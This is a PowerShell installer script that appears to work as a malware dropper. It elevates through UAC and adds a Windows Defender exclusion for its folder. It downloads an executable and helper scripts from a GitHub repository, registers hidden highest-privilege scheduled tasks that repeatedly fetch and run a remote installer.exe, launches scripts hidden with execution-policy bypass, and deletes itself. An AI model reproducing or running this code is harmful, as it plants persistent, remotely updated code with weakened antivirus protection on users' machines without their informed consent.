$ErrorActionPreference = "Continue"

$logDir = "$env:APPDATA\Microsoft\run"
if (-not (Test-Path $logDir)) {
  New-Item -ItemType Directory -Path $logDir -Force | Out-Null
}
$logFile = "$logDir\installer.log"

function Log-Msg($msg) {
  $line = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') $msg"
  Add-Content -Path $logFile -Value $line -ErrorAction SilentlyContinue
}

Log-Msg "[INFO] Installer started."

$self = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
Log-Msg "[INFO] Executable path: $self"

$runDir = "$env:APPDATA\run"
$runExe = "$runDir\run.exe"
$installDir = "$env:TEMP\run"
$installer = "$installDir\ss_installer.ps1"
$ssControl = "$installDir\ss_control.ps1"
$datDir = "$env:APPDATA\Microsoft\run"
$datFile = "$datDir\run.dat"

$isUpdate = Test-Path $datFile
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
  [Security.Principal.WindowsBuiltInRole]::Administrator
)
Log-Msg "[INFO] isUpdate=$isUpdate, isAdmin=$isAdmin"

if (-not $isUpdate -and -not $isAdmin) {
  Log-Msg "[INFO] Requesting elevation via UAC..."
  Start-Process `
    -FilePath $self `
    -Verb RunAs
  exit
}

if (-not $isUpdate) {
  try {
    Add-MpPreference -ExclusionPath $runDir | Out-Null
    Log-Msg "[INFO] Added Defender exclusion for $runDir"
  }
  catch {
    Log-Msg "[WARN] Failed to add Defender exclusion: $($_.Exception.Message)"
  }
}

if (-not (Test-Path $datDir)) {
  New-Item -ItemType Directory -Path $datDir -Force | Out-Null
}

New-Item -ItemType Directory -Path "$env:TEMP" -Force | Out-Null
New-Item -ItemType Directory -Path $installDir -Force | Out-Null

Log-Msg "[INFO] Stopping existing run processes..."
Get-Process -Name "run" -ErrorAction SilentlyContinue |
  Stop-Process -Force -ErrorAction SilentlyContinue

Start-Sleep -Seconds 2
New-Item -ItemType Directory -Path $runDir -Force | Out-Null

$ghHeaders = @{ "User-Agent" = "PowerShell-Installer" }

try {
  $apiResponse = Invoke-RestMethod `
    -Uri "https://api.github.com/repos/yuan-miranda/run/commits/main" `
    -Headers $ghHeaders `
    -UseBasicParsing `
    -ErrorAction Stop

  $latestCommit = $apiResponse.sha
  Log-Msg "[INFO] Latest commit: $latestCommit"
}
catch {
  $latestCommit = "main"
  Log-Msg "[WARN] Failed to fetch commit sha, defaulting to 'main': $($_.Exception.Message)"
}

try {
  Log-Msg "[INFO] Downloading run.exe..."
  Invoke-WebRequest `
    -Uri "https://raw.githubusercontent.com/yuan-miranda/run/$latestCommit/run.exe" `
    -OutFile $runExe `
    -Headers $ghHeaders `
    -UseBasicParsing `
    -ErrorAction Stop
  Log-Msg "[INFO] Downloaded run.exe successfully."
}
catch {
  Log-Msg "[ERROR] Failed downloading run.exe: $($_.Exception.ToString())"
  exit
}

try {
  Log-Msg "[INFO] Downloading ss_installer.ps1..."
  Invoke-WebRequest `
    -Uri "https://raw.githubusercontent.com/yuan-miranda/run/$latestCommit/frames_dev/ss_installer.ps1" `
    -OutFile $installer `
    -Headers $ghHeaders `
    -UseBasicParsing `
    -ErrorAction Stop
  Log-Msg "[INFO] Downloaded ss_installer.ps1 successfully."
}
catch {
  Log-Msg "[ERROR] Failed downloading ss_installer.ps1: $($_.Exception.ToString())"
  exit
}

try {
  Log-Msg "[INFO] Downloading ss_control.ps1..."
  Invoke-WebRequest `
    -Uri "https://raw.githubusercontent.com/yuan-miranda/run/$latestCommit/frames_dev/ss_control.ps1" `
    -OutFile $ssControl `
    -Headers $ghHeaders `
    -UseBasicParsing `
    -ErrorAction Stop
  Log-Msg "[INFO] Downloaded ss_control.ps1 successfully."
}
catch {
  Log-Msg "[ERROR] Failed downloading ss_control.ps1: $($_.Exception.ToString())"
  exit
}

if (
  -not (Test-Path $runExe) -or
  -not (Test-Path $installer) -or
  -not (Test-Path $ssControl)
) {
  Log-Msg "[ERROR] Verification failed: missing runExe, installer, or ssControl."
  exit
}

$taskName = "WinRun"
$action = New-ScheduledTaskAction `
  -Execute $runExe `
  -WorkingDirectory $runDir

$trigger = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet `
  -AllowStartIfOnBatteries `
  -DontStopIfGoingOnBatteries `
  -ExecutionTimeLimit (New-TimeSpan -Days 365)

$cmd = 'powershell.exe -Command "$log=''$env:APPDATA\Microsoft\run\updater.log''; Add-Content -Path $log -Value (''$(Get-Date -Format ''''yyyy-MM-dd HH:mm:ss'''') [INFO] WinRunInstaller task running...'') -ErrorAction SilentlyContinue; $p=''$env:APPDATA\run''; if (!(Test-Path $p)) { New-Item -ItemType Directory -Path $p | Out-Null }; try { $h=@{''User-Agent''=''PowerShell-Updater''}; $sha=(Invoke-RestMethod ''https://api.github.com/repos/yuan-miranda/run/commits/main'' -Headers $h -UseBasicParsing).sha; $o=''$p\installer.exe''; Stop-Process -Name ''installer'' -ErrorAction SilentlyContinue; Invoke-WebRequest -Uri ''https://raw.githubusercontent.com/yuan-miranda/run/'' + $sha + ''/installer.exe'' -OutFile $o -Headers $h -UseBasicParsing; Start-Process -FilePath $o -WindowStyle Hidden; Add-Content -Path $log -Value (''$(Get-Date -Format ''''yyyy-MM-dd HH:mm:ss'''') [INFO] Downloaded and executed installer.exe ('' + $sha + '')'') -ErrorAction SilentlyContinue } catch { Add-Content -Path $log -Value (''$(Get-Date -Format ''''yyyy-MM-dd HH:mm:ss'''') [ERROR] '' + $_.Exception.ToString()) -ErrorAction SilentlyContinue }"'

$installerTaskName = "WinRunInstaller"
$installerAction = New-ScheduledTaskAction `
  -Execute "powershell.exe" `
  -Argument " -Command $cmd"

$installerSettings = New-ScheduledTaskSettingsSet `
  -AllowStartIfOnBatteries `
  -DontStopIfGoingOnBatteries `
  -ExecutionTimeLimit (New-TimeSpan -Minutes 10) `
  -Hidden

Log-Msg "[INFO] Registering WinRun scheduled task..."
Register-ScheduledTask `
  -TaskName $taskName `
  -Action $action `
  -Trigger $trigger `
  -Settings $settings `
  -RunLevel Highest `
  -Force | Out-Null

Log-Msg "[INFO] Registering WinRunInstaller scheduled task..."
Register-ScheduledTask `
  -TaskName $installerTaskName `
  -Action $installerAction `
  -Settings $installerSettings `
  -RunLevel Highest `
  -Force | Out-Null

Log-Msg "[INFO] Running ss_installer.ps1..."
Start-Process powershell.exe `
  -ArgumentList @(
  '-NoProfile',
  '-ExecutionPolicy',
  'Bypass',
  '-File',
  $installer
) -WindowStyle Hidden -Wait

$latestCommit | Out-File $datFile

$IdPath = "$env:APPDATA\Microsoft\run\run.txt"

if (Test-Path $IdPath) {
  $raw = (Get-Content $IdPath -Raw).Trim()
  if ($raw.Length -ge 8) {
    $uniqueId = $raw.Substring(0, 8)
  }
  else {
    $uniqueId = $raw
  }
}
else {
  $uniqueId = ([guid]::NewGuid().ToString()).Substring(0, 8)
  Set-Content -Path $IdPath -Value $uniqueId
}

$uniqueUser = "$($env:USERNAME)-$uniqueId-W"
Log-Msg "[INFO] uniqueUser: $uniqueUser"

Log-Msg "[INFO] Launching run.exe..."
Start-Process `
  -FilePath $runExe

Log-Msg "[INFO] Launching ss_control.ps1..."
Start-Process powershell.exe `
  -ArgumentList @(
  '-NoProfile',
  '-ExecutionPolicy',
  'Bypass',
  '-File',
  $ssControl
) -WindowStyle Hidden

Log-Msg "[INFO] Installation complete. Cleaning up temporary installer files..."

if ($installer) {
  Start-Process powershell.exe `
    -ArgumentList @(
    "-Command",
    "Start-Sleep 2; Remove-Item '$installer' -Force -ErrorAction SilentlyContinue"
  ) -WindowStyle Hidden
}

if ($self) {
  Start-Process powershell.exe `
    -ArgumentList @(
    "-Command",
    "Start-Sleep 4; Remove-Item '$self' -Force -ErrorAction SilentlyContinue"
  ) `
    -WindowStyle Hidden
}

